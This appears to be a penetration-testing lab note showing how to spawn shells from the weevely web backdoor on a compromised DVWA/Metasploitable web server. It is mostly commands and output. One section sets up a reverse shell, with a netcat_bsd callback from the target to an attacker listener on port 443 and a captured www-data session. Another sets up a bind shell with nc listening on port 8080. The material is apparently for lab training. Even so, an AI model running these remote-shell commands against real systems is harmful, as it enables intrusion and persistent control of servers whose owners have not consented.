# 05 - Spawn Callback Shell

## 5.1 Reverse Shell

* Attacker (waiting callback)

`user@pentestos:~$ sudo ncat -lnvp 443`

* Compromised Target (Web Server)

```
weevely> backdoor_reversetcp -h
The remote script execution triggers an error 500, check script and payload integrity
usage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect] [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}] lhost port

Execute a reverse TCP shell.

positional arguments:
  lhost                 Local host
  port                  Port to spawn

optional arguments:
  -h, --help            show this help message and exit
  -shell SHELL          Specify shell
  -no-autonnect         Skip autoconnect
  -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ backdoor_reversetcp -shell /bin/bash -vector netcat_bsd 172.28.128.14 443
The remote script execution triggers an error 500, check script and payload integrity
Error binding socket: '[Errno 98] Address already in use'
```

- Attacker (callback established)

```
user@pentestos:~$ sudo ncat -lnvp 443
[sudo] password for user:
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.28.128.8.
Ncat: Connection from 172.28.128.8:47902.
bash: no job control in this shell
www-data@metasploitable:/var/www/dvwa/vulnerabilities$ ls
brute
csrf
exec
fi
sqli
sqli_blind
upload
view_help.php
view_source.php
view_source_all.php
xss_r
xss_s
www-data@metasploitable:/var/www/dvwa/vulnerabilities$
```

## 5.2 Bind Shell

The `:backdoor_tcp` command module function in weevely for spawning a remote shell via netcat.

* Compromised Target (Web Server)

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ backdoor_tcp -shell /bin/bash -vector netcat 8080
The remote script execution triggers an error 500, check script and payload integrity
Error connecting to 172.28.128.8:443: remote port not open or unreachable
```

The alternative is you run with any commands.

`www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ nc -lnvp 8080`

* Attacker

`user@pentestos:~$ nc 172.28.128.8 8080`

---
## References

* [Web App Hacking Part 6 Injecting a Backdoor into a Website with Weevely](https://www.hackers-arise.com/post/2017/12/03/Web-App-Hacking-Part-6-Injecting-a-Backdoor-into-a-Website-with-weevely)